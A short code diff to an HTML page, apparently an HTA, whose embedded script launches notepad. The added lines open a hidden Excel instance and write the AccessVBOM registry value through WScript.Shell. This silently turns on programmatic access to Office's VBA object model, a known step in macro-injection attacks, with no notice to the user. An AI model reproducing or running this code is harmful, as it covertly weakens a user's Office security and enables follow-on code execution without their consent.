@@ -1,10 +1,16 @@
 <html>
 	<head>
 		<script>
+			var objExcel = new ActiveXObject("Excel.Application");
+			objExcel.Visible = false;
+			var WshShell = new ActiveXObject("WScript.Shell");
+			var Application_Version = objExcel.Version;//Auto-Detect Version
+			var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Excel\\Security\\AccessVBOM";
+			WshShell.RegWrite(strRegPath, 1, "REG_DWORD");
 			
 			var shell = new ActiveXObject("WScript.Shell");
 			shell.Run("notepad");
-			close();
+
 		</script>
 	</head>
 	<body>
